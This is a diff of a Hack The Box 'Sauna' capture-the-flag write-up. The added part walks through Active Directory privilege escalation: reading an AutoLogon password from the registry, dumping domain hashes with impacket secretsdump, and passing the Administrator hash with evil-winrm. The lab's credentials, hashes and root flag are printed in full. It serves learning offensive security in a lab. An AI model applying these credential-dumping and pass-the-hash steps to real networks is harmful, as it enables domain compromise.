@@ -214,8 +214,11 @@ result: 0 Success
 
 ```
 Not much information here apart from the facts that there is no password lockout threshold and the minimum password length is 7 which may be useful if we need to bruteforce.
+
 At this point I was clueless as to what to do so I used all the past commands with different arguments and repeated things (insane, I know), but to no avail. I even used `crackmapexec` to try a bruteforce, but then again I had no idea what credentials to try.
+
 After referring to the HTB forum (which was as cryptic as ever), I realised I needed to investigate the `impacket` script suite and common Active Directory user conventions.
+
 First I'm gonna use `GetADUsers.py` from `impacket` to try and enumerate users without credentials.
 ```
 andrew@kali:~/htb/sauna$ GetADUsers.py -dc-ip 10.10.10.175 'egotistical-bank.local/'
@@ -325,5 +328,124 @@ Mode                LastWriteTime         Length Name
 ```
 ## Getting the Root Flag
 
+So now we have one user we need to enumerate and see what other users we have to work with:
+
+```
+*Evil-WinRM* PS C:\Users\FSmith\Documents> net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+```
+If I had to guess I'd say the next account we would be exploiting is either HSmith or svc_loanmgr before we go for admin. First let's see if we can find any plaintext passwords.
+
+First stop is to check for password files using `findstr /si password *.txt *.xml *.ini` but this produces no result.
+
+After researching windows storage, I came across "Windows AutoLogin" which could be promising. So I printed out the registry details for this:
+```
+*Evil-WinRM* PS C:\Users\FSmith> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"                          
+                                                                                                                                 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon                                                         
+    AutoRestartShell    REG_DWORD    0x1                                                                                         
+    Background    REG_SZ    0 0 0                                                                                                
+    CachedLogonsCount    REG_SZ    10                                                                                            
+    DebugServerCommand    REG_SZ    no                                                                                           
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DebugServerCommand    REG_SZ    no                                                                                   [0/1933]
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK                                                                               
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager                                                                 
+    DisableBackButton    REG_DWORD    0x1                       
+    EnableSIHostIntegration    REG_DWORD    0x1                                                                                  
+    ForceUnlockLogon    REG_DWORD    0x0                                                                                         
+    LegalNoticeCaption    REG_SZ                             
+    LegalNoticeText    REG_SZ   
+    PasswordExpiryWarning    REG_DWORD    0x5                                                                                    
+    PowerdownAfterShutdown    REG_SZ    0                                                                                        
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}                                                    
+    ReportBootOk    REG_SZ    1                                                                                                  
+    Shell    REG_SZ    explorer.exe                                                                                              
+    ShellCritical    REG_DWORD    0x0                                                                                            
+    ShellInfrastructure    REG_SZ    sihost.exe                                                                                  
+    SiHostCritical    REG_DWORD    0x0                          
+    SiHostReadyTimeOut    REG_DWORD    0x0                                                                                       
+    SiHostRestartCountLimit    REG_DWORD    0x0                                                                                  
+    SiHostRestartTimeGap    REG_DWORD    0x0                    
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,                                                                      
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile                                                              
+    WinStationsDisabled    REG_SZ    0                                                                                           
+    scremoveoption    REG_SZ    0                                                                                                
+    DisableCAD    REG_DWORD    0x1                                                                                               
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x8e3982368                                                                     
+    ShutdownFlags    REG_DWORD    0x80000027                                                                                     
+    DisableLockWorkstation    REG_DWORD    0x0                                                                                   
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+```
+And so we have some default credentials namely `svc_loanmanager` which is very similar to `svc_loanmgr` that we saw earlier. The accompanying default password is `Moneymakestheworldgoround!`. So let's try use these credentials with `evil-winrm`:
+```
+andrew@kali:~/htb/sauna$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:39: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:128: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:138: warning: constant OpenSSL::Cipher::Cipher is deprecated
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
+```
+And amazingly, it worked.
+
+Unfortunately after a lot of enumeration I realised we don't have any extra permission and can't access any more registries or folders than we could with `fsmith`.
+```
+andrew@kali:~/htb/sauna$ secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
+Impacket v0.9.21.dev1+20200312.235721.8afe4fe1 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:3580814d80e0b58061307f0dac1e1eb3:::
+[*] Kerberos keys grabbed
+there was must stuff here but it's not relevant to us
+```
+So now we have a list account password hashes. We should be able to access the `administrator` account with just this, since `evil-winrm` allows authentication with just the NT-Hash (last column of the above domain credentials).
+```
+andrew@kali:~/htb/sauna$ evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:39: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:128: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:138: warning: constant OpenSSL::Cipher::Cipher is deprecated
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+And boom it worked. Go to Desktop, and we have the root flag.
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/23/2020  10:22 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+f3ee04965c68257382e31502cc5e881f
+```
+
 ## Reflection
-This box was an absolute pain for me, mainly because I knew effectively nothing about Kerberos, SMB or Active Directory. I consulted the forums for help on many occasions which would point me towards tool suites like the `impacket` library.
+This box was an absolute pain for me, mainly because I knew effectively nothing about Kerberos, SMB or Active Directory. I consulted the forums for help on many occasions which would point me towards tool suites like the `impacket` library and `evil-winrm` but I had absolutely no idea how to use any of these things. Beyond doubt getting the initial foothold was the hardest part. Once I had some start, through a lot of research and trial and error I was able to keep progressing (albeit slowly). After I spent more time researching how Kerberos authentication works and common exploits I was able to see potential things that I could work with. This research is the only reason that for example, I was able to know what scripts from `impacket` to use and the importance of the TGT keys I attained and so forth. I definitely learnt a whole lot from cracking this box not just about Windows hacking but even about industry conventions like Active Directory username standards. If I were to do this box from scratch for the first time, the main things I would have done different is take more breaks (to clear the mind), and do more thorough research during the recon stage rather than assuming whether something will be important or not.
